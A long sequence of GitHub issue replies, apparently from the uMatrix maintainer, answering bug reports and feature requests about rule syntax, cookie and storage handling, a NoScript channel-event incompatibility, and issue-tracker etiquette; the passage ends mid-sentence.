\ncookie deleted: http://thetvdb.com/{session-cookie:PHPSESSID}\nIn the logger turning off cookie deletion and then visiting http://thetvdb.com/.\nInvestigating.\n. Duplicate of #489.\n. My mistake, it's a duplicate of #385, not #489.\n. How did you open the list, left-click or middle-click?\nLeft-click will cause uMatrix to see the resource through the asset viewer, while with middle-click Firefox bypasses uMatrix's JS code and open the nominal link under the mouse.\n. Sure, just change the title to reflect the real issue, the current title might cause unneeded worries.\n. Duplicate of #203.\nJust open uMatrix popup panel and remove the block rule.\n. Thank you for your contribution.\n. I don't think it is a good idea.\n. Sorry, didn't realize I had not updated the Chrome store version. I just published it, don't know how long it will take to become available.\n. Duplicate of #513.\n. This would required a complete refactoring of the core filtering code, while adding complexity to it. I will pass on this.\n. That's a chrome API limitation (which makes sense), only one extension is allowed to modify a specific header. You will have to pick one or the other -- you can disable uBO's referrer spoofing in the Privacy pane in the dashboard.\n. Use youtube.com googlevideo.com other allow. Subdomains implicitly inherit rules from broader rules, you don't need to use *..\n. Click the all cell?\n. If you want to work in allow-all/block-exceptionally mode (i.e. toggling the all cell to allow), then blocking ubiquitous 3rd parties as you spot them is just a matter of selecting the global scope (the asterisk * in the scope-selector menu), and blocking the whole domain of those 3rd parties:\n\nPic above shows the blocking of facebook.com, facebook.net, twimg.com, twitter.com everywhere by default (because these rules were created while the global scope is selected).\nThen click the padlock to commit these rules, and be sure to revert back to local scope to avoid mistakenly setting rules in the global scope next time you open the popup panel.\n. Then if you land on a facebook.com page, which will be wholly blocked as a result of above rules, it's a matter of creating a local allow rule for facebook.com, facebook.net:\n\n\nCommit these rules, now you are blocking Facebook everywhere, except of Facebook.\n. Please, as stated on the front page of the project, this is not the place for this:\n\nKeep Github issues for bugs. User support is Mozilla's add-on-support.\n. Duplicate of #505.\n. I don't understand the request -- about-scheme * * allow seems to accomplish what you want.\n. uMatrix is entirely based on rules, I do not intend to create exceptions to this -- I want uMatrix's behavior to be predictable.\n. uMatrix version please.\n. Do you have the about:config option extensions.umatrix.forceLegacyToolbarButton set to true? If so, reset the value to false, see if this helps.\n. uMatrix uses FF's SQlite API, so something wrong on your computer -- quite possibly a corrupted uMatrix's SQlite db. I suggest you back up your settings, delete [your Firefox profile]/extension-data/umatrix.sqlite, then restore your backup.\n\nThere were issues opened in the past about corrupted SQlite db, look for them here and in uBO project for insights on how to avoid such corruption.\n. Duplicate of #56.. I don't understand the suggestion.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Closing: old issue, no exact repro steps (1., then 2., then 3., etc.), no relevant information provided (browser, version, ruleset, etc.), no evidence provided (example, logger output stating that such and such cookies were deleted). I will re-open when the case is clearly made there is an issue with uMatrix.\nClosing and marking as invalid, as per CONTRIBUTING.. Unable to reproduce with FF56.. Use \"Clear browser cache every [...] minutes\" to take care of etag-based tracking.\n. There is a specific code path for which the CSP directive created by uMatrix is malformed.\n. I uploaded 0.9.3.5rc0 with the fix in the dev channel on AMO.\n. Yes, it needs work to bring it on par with uBO's one. Another thing missing is the the rule which caused a request to be blocked/allowed, that would be useful too.\n. Thanks for the investigation/insight, I didn't know about Components.utils.getWeakReference() -- that would solve the issue I was facing not being able to iterate through a WeakMap. However there is this part in the doc:\n\njust because get() succeeds doesn't mean your object is valid. It might simply not have been garbage collected yet\n\nSo the way I understand this, I would have to double-check whether the weak browser reference is really valid by looking up  => ID?\n. If this works well, I will import the changes into uBO as well.\n. > That means JS is still executed.\nNo, it means noscript tags are not parsed. See https://github.com/gorhill/uMatrix/issues/319.\nClosing as duplicate of #319.\n. uMatrix/webext uses <all_urls> now in the manifest, so I will close this.\nNext time, for that sort of issue I will need a reproducible case.. Already in there since a while, reported in XHR column.. Closing and marking as invalid, as per CONTRIBUTING.\n. What else did you try aside \"deactivation of the extension\"?\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Did you try disabling the per-site switches? Are you blocking stuff in the behind-the-scene scope? What does the logger says?\n. > YES\nSorry, can't help you.\n. After you changed the rules, did you force a refresh of the page using uMatrix's own button? (The page works fine for me using default settings in uMatrix, no need to disable it).\n. This file is not longer part of the project.. Plan is to decline.\n. I have created more documentation lately, so hopefully this addresses the issue.. The rules are a view on uMatrix internal database -- there can't be comments, they would be discarded whenever a rule is removed through a mere click on a cell in the popup panel.\n. Browser issue -- out of control of uMatrix.\n. Fixed with #572.\n. Everything works fine here.\n. I could reproduce, somehow, need to figure out how.\n. Finding so far:\nWith NoScript enabled, the data uBO attaches to the channel instance in its http observer[1] can no longer be found. This could be because this data is trashed somehow, or because NoScript creates an entirely new channel instance, causing the older one to be discarded. Will need insights from NoScript people.\nIn the current state, uMatrix is incompatible with NoScript: NoScript appears to clobber uMatrix's internal data.\n[1] Line 2048 of vapi-background.js\n. By the way, \"cookie leak\" is just one symptom of the issue here, the bigger problem is that other parts of uMatrix are crippled by the loss of contextual data when NoScript is enabled.\n. @laniakea64 Any quick insight about why the channel data is lost (or why the channel at http-on-modify-request time is not the same as the one at http-on-opening-request)?\n. I am currently looking here, it seems this is called for every http-on-opening-request.\n. If I un-check NoScript's \"Enable ABE\", the issue goes away.\n. ABE.js uses ChannelReplacement objects, defined here.\n. The repro steps for me are these:\n- Enable uMatrix and NoScript.\n- Go to http://raymondhill.net/httpsb/httpsb-test-cookie-1.php.\n- Configure uMatrix so that cookies are blocked for raymondhill.net, persist.\n- Close the tab.\n- Quit Firefox.\n- Launch Firefox.\n- Go to http://raymondhill.net/httpsb/httpsb-test-cookie-1.php.\n- Force a reload of the page: the page is not supposed to say \"Cookies sent to the server by your browser\" when cookies to raymondhill.net are blocked.\nFrom uMatrix's point of view, the properties it sets on the channel at http-on-opening-request time are gone once http-on-modify-request is fired.\n. How do you debug NoScript? It does not show up in the list at about:debugging#addons on my side. \n. > uMatrix could use a ChannelEventSink to set them on the new, redirected channel.\nThat's what uMatrix does already (see here).\nThe properties are the tab id (string), request type (number) (see here -- the comment is not accurate, the attached data is also useful for other phases of the request: http-on-modify-request, http-on-examine-response).\n. I don't have time to investigate more for now, but I just found that this line seems to throw an exception. So that could be the problem? (or just another symptom of whatever the reason it is that umtrixreqdata can no longer be found).\n. Correction to my comment above: there is no exception, it seems to just be a debugger quirk, giving the impression that an exception is throw.\nSomething else I found: uMatrix properties are not attached on the channel in the first place because http-on-opening-request is never fired if the debugger is to be believed. I see only http-on-modify-request and http-on-examine-... notifications.\nSo at this point it comes down to find out why http-on-opening-request is not fired for uMatrix in the current scenario.\n. Latest finding is that http-on-opening-request is not fired for uMatrix in the reported problematic scenario. When I force a refresh of the page, this is what uMatrix is notified about with NoScript enabled:\nuMatrix: 69 observe() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\" topic=\"http-on-modify-request\"\nuMatrix: 70 asyncOnChannelRedirect() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\"\nuMatrix: 71 observe() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\" topic=\"http-on-modify-request\"\nuMatrix: 72 observe() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\" topic=\"http-on-examine-response\"\nThe number following \"uMatrix\" is a simple counter to be sure to understand the sequence of event in time.\nIf I disable NoScript, http-on-opening-request is fired every time I force a refresh\nuMatrix: 84 observe() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\" topic=\"http-on-opening-request\"\nuMatrix: 85 observe() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\" topic=\"http-on-modify-request\"\nuMatrix: 86 observe() url=\"http://raymondhill.net/httpsb/httpsb-test-cookie-1.php\" topic=\"http-on-examine-response\"\n. > An easy work-around would be assigning your extra properties in http-on-modify-request, I guess.\nThis also mean that any extension which relies on http-on-opening-request would have to implement such workaround just for the sake of working properly with NoScript specifically.\nI could probably add a code path to uBO/uMatrix for the sake of working around http-on-modify-request, but that does not feel right to have such a workaround just in case one other specific extension is installed.\n. > you should not modify requests (e.g. by adding headers or properties) in \"http-on-opening-request\"\nNeither uBlock or uMatrix do this. Headers are modified strictly at http-on-modify-request and/or http-on-examine-response time.\n\nthis is gonna be quite common in the brave new WebExtensions world, since webRequest's redirectUrl implementation does exactly that\n\nWith Chrome API, never does the use of redirection prevent onBeforeRequest from being properly fired to all listening extensions.\nI strongly believe that it is reasonable for an extension subscribing to http-on-opening-request to always be notified through http-on-opening-request for every new request. This is the issue here, the http-on-opening-request event is being \"eaten\" from the point of view of those extensions which listen to http-on-opening-request events.\n. > In facts, Firefox's onBeforeRequest implementation relies on \"http-on-modify-request\", not on \"http-on-opening-request\"\nThanks for the information. I really want to be sure I understand properly all this. The doc on chrome.onBeforeRequest says this (my emphasis):\n\nonBeforeRequest (optionally synchronous)\nFires when a request is about to occur. This event is sent before any TCP connection is made and can be used to cancel or redirect requests.\n\nIs \"sent before any TCP connection is made\" also true for Firefox's http-on-modify-request?\n. > Yes\nWell then, I should be able to move everything at http-on-modify-request with little modifications for both uMatrix/uBO.\n. Because these appears in one of the blacklist. This is how uMatrix works.\n. Who's \"Cris\"?\nAnyways, closing and marking as invalid, as per CONTRIBUTING.\n. No extensions work while in Chrome webstore when using Chromium/Chrome.\n. That would require a whole new UI and core implementation.\n. Please use the latest version of uMatrix, which is 0.9.3.4, and see if this works. If not, could you try the dev version (available on AMO) 0.9.3.5rc1?\n. Duplicate of #330.. > On many websites blocking fisrt-party cookie makes the login records in cookie get overwritten. That forces me to enter the password again\nDon't block these 1st-party cookies if you do not like the side effects of blocking 1st-party cookies.\n. I can't make sense of your request here: on a site which requires cookies to log in, you want to be able to login without cookies being exchanged.\n. Duplicate of #455.\n. The feature suggested here is merely adding a per-site switch to existing infrastructure/UI, #515 is a grand rewriting of the extension core- and UI-wise.\n. > mixed content can be a massive security risk and I would rather get an error\nThat was not your original issue. Browsers already block scripts from non-encrypted connections for content pulled from encrypted connections: a script http://example.com/script.js pulled from within https://example.com/index.html will not be allowed by a browser.\n. @Atavic my understanding is that the concerns here are about MITM. Even some ISPs have been caught inserting their own javascript.\n. > ||http://*$script,important\nThe double-pipe || is to anchor to a domain label, it makes no sense to use it in front of https:// or even to use it like ||*. This is the right filter in uBO:\n|http:$script,important\n\n. Read carefully: https://github.com/gorhill/uMatrix#warnings.\n. There was no change. If you want the subdomains to be visible, expand using the expand/collapse button on the all cell.\n. Thanks.\n. Whether the local storage is cleared or not depends on the \"cookie\" column in the matrix, and whether the setting to cleared local storage is enabled.\n\nhow about a feature to allow dom storage (perhaps treat it separately from cookies) and and be able to specify an interval to delete it periodically like what is capable for cache and cookies?\n\nThe cache is a browser-wide operation. Cookies and local storage is a per-site rule, reflected by the \"cookie\" cell in the matrix.\n. - A web page loads\n- uMatrix checks whether cookies are blocked/allowed for the page\n  - if cookies are blocked, then uMatrix checks if the setting to delete local storage is enabled\n    - if the setting is enabled, the content of window.localStorage/window.sessionStorage is cleared\n. > is dom storage cleared along with cookies at the specified interval\nNot along with cookies, and not a interval: it's done once at page load time, using a content script, because window.localStorage/sessionStorage can be accessed only using same-origin policy.\n. I will no longer support legacy Firefox and browsers based on legacy Firefox -- I don't have the time for such a low adoption extension on lower adoption browsers.. You did not list other per-site settings which can also affect web pages: Strict HTTPS, user agent spoofing, referrer spoofing. If any of these switches are enabled, try toggling them.\n. Alright, I am going to close this as invalid: you do not make the case that there is an issue with uMatrix code (there is no word on whether you investigated the per-site switches). Also, you do not provide any specific URL where the issue can be immediately seen. Make the case there is an issue with uMatrix, and if so, provide easy to repro steps -- never assume I have a handful of bookmarks where your specific issue can be immediately seen (as in no need to log in).\n. Please report to the addon causing the issue, not the one suffering from it.\n. To be clear, there is no web-exposed resources in uMatrix or uBlock Origin.\n. It's not designed to fit in the narrow menu.\n. https://github.com/gorhill/uMatrix/issues?q=is%3Aissue+vimperator+is%3Aopen\n. I looked carefully at the content of your video, and all is working as expected. You are creating two \"graylist\" rules ( inherit) to override the global whitelist rules for embedly.com. These graylist rules tells uMatrix to inherit the rules from the X and Y axes of the matrix, and being explicit rules, they cancel inheritance from the Z axis -- thus the rules for embedly.com frame and embedly.com script are no longer taken from the broader scope (the global one in the current instance), but only from the state of the local hostname and type if they have explicit rules, or the all cell as last resort. I am not sure to understand what you did expect to happen.\n. > It does NOT delete the inherit rule\nIt comes down to the fact that uMatrix can't read mind. It's not a given that an explicit inherit rule should be removed automatically: one may have toggled the global rule by accident, or just want to remove the global rule temporarily. At time of implementation, I did ponder whether I should remove narrower rules which may have become irrelevant, but that is just guessing, uMatrix can't know for sure what is the intent of the user. At most, uMatrix could offer an Optimize button in the My rules pane, but it can't do this autmatically and silently. This was also brought up in the past.\n. > the inherit rule has nothing to inherit from\nThere is no such thing as \"has nothing to inherit from\" in uMatrix. A cell always inherits from another cell (the exception being the all cell) -- this is the essence of uMatrix. When a cell has no explicit rule (implicitly graylisted) or is explicitly graylisted, uMatrix will walk-up the inheritance paths (z, then x/y) until it finds one or more explicit rules.\nThe fact that some seemingly pointless inherit rules can be left behind is completely a trivial issue -- there is absolutely no harm, and certainly not worth adding code upon code to try to deal with this, using a guessing approach at that.\n. Just block piwik.gitlab.com. I really do not intend to change the UI, it is set in stone. One could add knobs and switches until the add-on become incomprehensible, I want to keep it simple just as it is now.\n. You already trusted gitlab.com, piwik.gitlab.com is 1st-party to gitlab.com. You are creating an issue out of thin air, and asking a major change in how UI matrix works to address this made up issue. Data collection could very well take place as well also on gitlab.com, and yet you trusted it.\n. > it is about making umatrix even more strict. inheritance in these cases can decrease security and can cause more privacy problems.\nJust use uBO's dynamic URL filtering, because by your logic, allowing all scripts from gitlab.com also \"decrease security and can cause more privacy problems\". The logical consequence of the logic of your argument is that you should allow scripts on a per-script basis, one by one -- and that is not uMatrix. It can be done with uBO though granted it's not an optimal UI for that purpose.\n. > or you are being dishonest now\nGPL, fork, etc.\n. I disagree with the need to implement your suggested feature, I marked it \"decline\", but you keep harping about how I am wrong disagreeing with you. How much wall of text and time to write them will it requires before it can be accepted that I won't implement a suggested feature?\nMy wish is that those requests I decline would be implemented by those who suggest them, I am absolutely convinced then with having to do the work it would dawn on those trying to implement their ideas that it is not such a trivial thing -- there are all sort of consequences to the UI and code with no so obvious solutions.\n. Let me comment on this:\n\nthen you proceeded to become irrational\n\nWhat is irrational to me is to unduly worry that you connected even once to piwik.gitlab.com after you explicitly said to uMatrix you were all fine with connecting to gitlab.com. This makes absolutely no sense. You do not want piwik.gitlab.com, just block it explicitly, then you will be fine forever afterward, it will still be blocked if ever you decide for whatever reasons to toggle the all cell to \"allow\", or toggle the script cell to \"allow\", etc. With your suggestion, the use of the all and type-based cells become weird, nonsensical, and things become even weirder if working in allow-all/block-exceptionally mode.\nThe bottomline is that I am not going to sabotage the sane UI and the sane core filtering code for the sake of addressing irrational worries.\n. The problem is that the test wintype !== 'navigator:browser' at line 1248 always succeed (i.e. wintype is never navigator:browser). uMatrix gives up trying after 8 tries.\nuBO is not affected by the issue, but this is a part I revised in uBO. I do notice a delay before the icon appears in uBO, so probably if uMatrix tried more, it would eventually be able to add its icon to the toolbar.\nThe code to add the icon in uBO is time-based -- it will give up after a set time, while the code to add the icon in uMatrix is try-based, it currently gives up after 8 tries. Solution will be to bring uBO code to uMatrix regarding toolbar icon handling.\n. I could fix the icon issue, but looking closer, there are other more serious issues with both uBO and uMatrix: the content of the popup panel in a private window does not match the web site of the current selected tab. Actually, it appears the popup panel depends on the tab selected on the original, non-private one.\nAddendum: the issue does not occur on Nightly, FF stable, and neither Pale Moon.\n. I confirm that the cause for the other issue described above is also because the windowtype attribute is not set for the private window. Wherever I look, the FF documentation is clear regarding windowtype:\n\nBrowser windows have a window type of navigator:browser.\n\nThis is not happening for a private window in SeaMonkey. I wonder if this is a bug in SeaMonkey.\n. I have a fix which is to further see if the id attribute is main-window as a fallback in case the windowtype is not navigator:browser. Seems to work fine, but the fix is entirely dependent on my observations using the debugger -- not of any documentation.\n. uMatrix/uBO inject a content security policy (\"CSP\") directive in response headers to prevent inline script tags from executing. I verified that with Chromium/Firefox, their respective handler for response headers is not invoked -- hence no CSP can be injected.\n. @Atavic: that does not work with NoScript 10, which is webext-based like uMatrix.. > anyway to block this in uM or uBo?\nThis would need to be tried -- see what the logger reports. If the logger reports the URL, then it should be blockable. I don't have Windows, so I can't try.. The new NoScript succeeds in blocking JS from file: URL. I looked into it and it does so by injecting the CSP directive through a <meta http-equiv...> in the DOM at document_start time -- clever.\nI will bring this technique to uMatrix. Note that this would still not solve the case for Chromium, this is possible in Firefox because it supports registering content scripts dynamically.. Fonts are evaluated using the css column, media are evaluated using the image column (which I plan to rename appropriately). Also, space is limited, I can't just keep adding columns.\n. > what restricts space?\nChromium does. I think there is even an issue opened about this somewhere. If you use a large page zoom enough in the Chromium settings, the popup panel will no longer fit horizontally, the browser limit the max width.\n. Key basic information missing: browser version/uMatrix version, exact URL to repro, etc. Will assume invalid entry until proper information is provided.\n. Somebody posted on Wilder Security that this was happening on Amazon. I can reproduce with front page https://www.amazon.ca/, in both uMatrix and uBlock on Nightly.\n. Turns out Firefox Nightly also reports network requests of type object[1] in the dev console:\n\nThis means uBlock/uMatrix is functioning properly. As to why these network requests exist at all, I have no clue. They all appear to be duplicate of earlier network requests  which were properly typed:\n\nThus uBO/uMatrix are just reporting what they see, the question now is to FF devs: why these duplicate network requests of type object (which uMatrix reports as plugins).\n\n[1] Type 5 as seen on this reference documentation.\n. I also verified that ABP also reports these object requests. Adguard appears to report them also, but as media requests.\n. I don't understand the reported issue -- can't answer. Be very specific please, with URL, explain what is wrong, what is expected, what exactly is being \"bypassed\", browser/version, settings, etc.\n. It's not helpful.\n\nsites are able\n\nProvide a list of such sites, not generalities. I can't investigate \"sites\", I can investigate pages at specific URLs. Post your URLs inside backticks, so they won't be parsed as links.\n\nuBlockOrigin identifies it as 3rd party\n\nuBO works all fine. The network request http://ws.00zasdf.pw/json was properly blocked by uBO using default filter lists, and it was also properly reported in the dynamic filtering pane of the popup panel (what I assume you call \"dashboard\").\n\nuMatrix identifies it as other and permitted, again ONLY in the log\n\nThe network request was labeled as behind-the-scene by uMatrix. It appears I forgot to import a fix I made in uBO -- specifically for Pale Moon a long while ago -- to find exactly from which tab the network request originated. This is now fix in 8464e3d594592c0410680c59d13c6ca630d0cd63.\nYour issue is too vague, I don't know what to make of it. If you really think there is an issue, make the case, post pics of logs/panels, details, specifics.\n. I can't answer because as said I didn't see any \"bypassing\" -- or I have no clue what you mean by \"bypassing\". As opposed to what you said, uBO filters properly http://ws.00zasdf.pw/json. Maybe somebody else will understand better.\n. The most important thing missing in this bug report was to substantiate \"blocked but ONLY in the log\", to make the case, by using the Network pane in dev tools. This is what I used to confirm that whatever uBO reports as blocked in its logger was correctly being blocked as per the dev tools' Network pane.\n. Your screenshots are not available.\n. Behind the scene requests:\n\nIf you choose to block wholly or partially behind-the-scene requests, you are responsible for any potentially negative side-effects.\n. > had he said websockets aren't really filtered it would have been more productive\n\nYou previous issue was \"pornhub bypassing uM and uBO\": I verified that this was not the case, hence closed as invalid. You failed to make the case. I just checked again: the logger reports http://ws.plmokn.pw/json as being blocked, and this is confirmed by the output of the Network pane in Pale Moon's dev tools, there is no connection to ws.plmokn.pw.\n. > thought he would update the wiki or something to warn others\nI do warn about blocking behind-the-scene network requests, I even quoted it above. I won't make a list of all that can break specifically and for each browser, the generic warning about important functions of the browser starting to not function properly is enough.\nWhat I could do however is to create a default rule such that the behind-the-scene scope works in allow-all/block-exceptionally mode by default. So if someone turns on matrix filtering for the behind-the-scene scope, I would expect the browser has better chance of functioning properly. Still, in the end users are responsible to understand the consequences of the rules they create/remove.\n. What did you try to identify the issue? Did you open the logger?\n. Logger? It's the fist tool to use when trying to diagnose page breakage issue.\n. Is the IP address of the blocked scripts exactly the same as the IP address of the document pulling these scripts?\n. Ok, I will look into this. I can't remember if this uBO issue I fixed in Firefox was also fixed for uMatrix.\n. Looks fine to me, I removed all the rules from uMatrix, so that even CSS and images won't be loaded, and this is clearly working as per thumbnails, and logger:\n\nYou will have to make a better case that it's not working.\n. With uMatrix's default rules, this is what I get for slashdot.org:\n\n. > is there some option to block HTML5-Video by default?\nFor the latest uMatrix stable release, HTML5 videos are reported in the other column. In the latest dev build, they are reported in the image column.\n. Thanks.\n. Did you also try to play with the per-site switches? (referrer spoof, etc.)\n. There is no feature to disable uMatrix for a site, the power button is to disable matrix filtering.\n. I plan on adding a badge for the per-site switches icon so as to remind users how many of the switches are turned on for the current site.\n. I don't have Windows, let alone Windows 10. This will have to be investigated by someone else.\nBy the look of the screenshots, it does appear that the popup panel is properly sized, just not properly displayed. Likely a Firefox issue, the panel is plain HTML/CSS/JS code. Does uBO display fine when the dynamic filtering pane is opened in the popup panel?\n. Please submit the issue to Windows or Firefox, as said, uBO's amd uMatrix's popup panel use plain legit HTML/CSS -- it's rendered by the browser.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Did you also check referrer-spoofer, agent-spoofer, strict https?\n. I just pushed a new dev build which should help not forget about these switches.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Just check the option \"Delete local storage content set by blocked hostnames\" in the dashboard -- it actually lookup cookie rules to wipe clear or not localStorage/sessionStorage.\n. uMatrix prevents blocked cookies from reaching the remote server. Optionally, if you check the relevant options in the dashboard, uMatrix will wipe from your browser the blocked cookies and localStorage/sessionStorage when you visit the site.\n. Just check the \"Delete blocked cookies\".\n. Did you try disabling all the per-site switch as well?\n. Anyways, not enough investigation went into this issue as per report in order to make the case there is an issue with uMatrix. No word of logger output. No word of per-site switches. No word on browser version. etc. The reported errors are from the site, not uMatrix. \nClosing and marking as invalid, as per CONTRIBUTING.\n. I do not plan to rewrite the core filtering engine, which such feature would require.\n. @jputting uMatrix and uBO are not my day job, they are side projects. You could hire one or more contractors to fix the issues which are important to you.. > you could acknowledge it and flag it appropriately\nI went through a lot of bug sorting in this repo in the last weeks, and a lots of issues were closed. I did not close this one.. @TriMoon \n\nThis kind of replies from you as the developer are just making users of this extension hostile....\n\nPlease do not lecture me. My reply was perfectly appropriate given his comment:\n\nIt is seems very clear that he is NOT interested at all in fixing this\n\nIf you want to lecture because an issue has been left opened with no comment, you have your work cut out on GitHub where such issues abound (example) -- and there is nothing wrong with this: it does not mean the developers do not care.\nSome people need to be reminded that they are using wholly volunteered code from GPL-licensed projects. Read carefully section 15 of the license, verbatim:\n\n\nDisclaimer of Warranty.\n\nTHERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\nLashing out at volunteer developers because they do not spend more time than they already do on their own volition is what is hostile.\nThe last thing I need on any given day is to have to deal with that sort of attitude of entitlement -- this just make visiting GitHub dreadful. I sure would have a had better day today without @jputting's unproductive comment which contributed nothing positive to the issue here or the project as a whole.. Duplicate of #483.. No.\n. This used to work like this. However the current behavior was implemented to support Firefox for Android. I do not intend to have a separate uBO extension just for Android.\nEdit: never mind, it's uMatrix here, not uBO. Should be a trivial fix.\n. Rule syntax: https://github.com/gorhill/uMatrix/wiki/Rules-syntax#directive-rule-syntax.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. > Cannot defend against SVG-based keylogger with images enabled\nYes you can: don't enable images for 3rd parties.\nIt's up to you to set up your defense the way you wish, according to your own prerogatives. If you worry about 3rd party images used for bad, just do not allow them: just remove the * * image allow rule.\n. I changed the wiki to point out where to get new strings from 3rd parties.\n. Thanks.\n. > When extension not there (or disabled): no crashes or hangs\nI cannot reproduce any hang or crash. If the browser crashes, report to Chromium devs, you probably have a tainted Chrome installation, try re-installing after cleaning your computer: https://decentsecurity.com/holiday-tasks/.\n. > Google Chrome 53.0.2785 64-bit (same problems back in v52)\n\nWindows 7 Home x64 SP-1\n\nhttps://chrome.googleblog.com/2015/11/updates-to-chrome-platform-support.html\n. I can reproduce.\n. Please, read the built-in doc about cookies.\n. > read the whole Documentation and all Infos\n\n. > This indicates for me, that the server can read the cookie\nNot the server, the javascript code of the page. It's clearly explained in the built-in doc that cookies are not prevented from being set. It's up to you to enable the deletion of blocked cookies.\n. > its an generally Problem of the way, how uMatrix handles the blocking of Cookies.\nThere is no problem. You forget the part where you can ask uMatrix to delete the blocked cookies.\n. The matrix filtering button applies to the current scope, so you can disable it on a per-site basis. Example of a rule:\nno-matrix-filtering: example.com true\n. > Do you understand?\nI have no idea why you think uMatrix should become an add-on manager.\n. Duplicate of #78.\n. And when one allows other, this allows much more than just media resources. Why would having these in other be of any help? At least with image (which I plan to rename media) you know what you are allowing in.\n. websocket can be merged with xhr. For media, I am still willing to consider adding one more column, this will require a lot of work in popup though, and further delay publication of a newer version, and time is short on top of that.. There is now a specific column for media.. Duplicate of #203.\n. Probably the browser console contained errors providing clues. Next time, please report any error reported in the browser console (Ctrl-Shift-J).\n. > So then you have to add duplicate line with * youtube.com frame allow, which, I think, is very impractical and now like that I need to add multiple lines for each website.\nThat's just how uMatrix works. If you do not want frames to be blocked globally, just remove the rule enforcing this (* * frame block), then you won't need to override it.\n\nso I add this rule twitch.tv cloudfront.net * allow, but it doesn't work.\n\nI just checked, and it does work.\n. poe.trade cloudfront.net * allow won't work because d3pkae9owd2lcf.cloudfront.net is blacklisted by one of the filter list. That's how uMatrix works: narrower rules win over broader ones. You choose how you want to override the blacklisted hostname:\nCancel blacklist status of d3pkae9owd2lcf.cloudfront.net everywhere:\n* d3pkae9owd2lcf.cloudfront.net * allow\nAllow all from d3pkae9owd2lcf.cloudfront.net on poe.trade only:\npoe.trade d3pkae9owd2lcf.cloudfront.net * allow\nAllow only script from d3pkae9owd2lcf.cloudfront.net on poe.trade only:\npoe.trade d3pkae9owd2lcf.cloudfront.net script allow\n. I don't know why. Looking up the hostname in the filter lists you have activated, and then ask whoever maintains that list.\n. > So then how do you know it is even blocked by any blocklist at all\nWell, if you did not block it yourself, then one of the lists did?\nLook, I do warn up front that uMatrix is for advanced users, I just do not have the time to assist users in diagnosing web site breakage etc., uMatrix is expected to break sites, its default settings are to block active content from 3rd-party servers by default.\n. I can't reproduce with FF 49 and the uMatrix icon in the default toolbar.\nWhat is this bar at the bottom in which I see the uMatrix icon?\n. Do you have the issue if uMatrix icon is in the default toolbar at the top?\n. Do you have the issue if you disable all other extensions, then restart Firefox?\n. > Disabling all add-ons and restarting, still have the problem\nYou have a screenshot?\n. > It looked the same.\nThe same as what? I asked you to try uMatrix without any other extensions. So far, you have followed up with two screenshots showing me uMatrix still with other extensions. You are making it difficult to investigate by resisting providing the information requested, i.e. try uMatrix without the status-4-ever extension. I want to know if the issue occurs only when that extension is enabled.\n. Do you have user styles?\nI will install FF48 and investigate when I find the time.\n. uMatrix version?\n. This was fixed in that version, see 09cf683e1a81c5d09f6b36c2212b02365a08679c.\n. Be sure it's not overridden by the setting extensions.umatrix.placeholderImage and extensions.umatrix.placeholderBackground in about:config.\n. Thanks.\n. No URL? Transcribing from the screenshot is going to be tedious.\n. Isn't what you want: https://github.com/gorhill/uBlock/wiki/Deploying-uBlock-Origin?\n. Ok, so you want your own default settings rather than the ones hard-coded into uBO?\n. Oops, I do this often, assuming I am on uBO's repo.\n. > Open uMatrix and enable everything\nWhy? Just remove the block rules (no need to use explicit allow rules) for googleadservices.com and www.googleadservices.com, then force a reload. Persist if you want to keep the rules permanently.\n\nit would be nice to have a \"Load anyway\" button\n\n203.\n\nhaving to do a ton of clicks inside the matrix to get the page to (maybe) unblock\n\nExaggeration. 1 click to bring up the matrix, 2 clicks to remove the block rules for googleadservices.com and www.googleadservices.com, 1 click to force a reload. This only for the exceptional case where you visit a site for which a block rule exists, and only if you chose to not persist the temporary removal of the block rules the first time.\n\n. Closing and marking as invalid, as per CONTRIBUTING.\n. Just be sure to use an encrypted connection to download a web page, your browser will not allow scripts from non-encrypted connections to run on the page.\n. Downloading a page from a non-encrypted connection is incompatible with worrying about MitM.\n. > Not all sites have https\nThen your rule * 1st-party script allow (but only https) would not accomplish anything.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. There is no repro steps.\n. Foiling fingerprinting is best left to another specialized extension.\n. Just create global allow rules for auxiliary hostnames, than create a local rule for youtube.com when you want to allow Youtube on a site, the other related rules in the global scope will then take effect.\n. Wildcard is implicit.\n. Seriously considering closing the issue tracker for a while with all issues opened with no respect to CONTRIBUTING.\n. As said in my last comment on the last invalid issue opened, I am closing it temporarily because of repeated invalid issues opened with complete disregard to CONTRIBUTING. It's my time being abused.\n. > Your web extension version 1.0.1b1 is not able to present any configuration or log window.\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1271354. @TriMoon \n\nThis is just a sign that @gorhill will abondon this project and leave it to die...\nWhat other acceptable reason would there be to deny bug reporting on  public project?\nMaybe someone should fork this project and manage it better...\n\nUnfortunately, forced to lock this issue because of the trolling.. You allowed UA spoofing in behind-the-scene scope?\n. > I believe\nWhat are your rules?\n. Actually I realize that uMatrix doesn't have default rules to prevent spoofing in the behind-the-scene scope. This is a mistake. Add these rules manually, commit, and see if this helps:\nreferrer-spoof: behind-the-scene false\nua-spoof: behind-the-scene false\nhttps-strict: behind-the-scene false\n. Duplicate of #182.\n. uMatrix uses the language set in your browser. Change your browser locale to English if you want to use 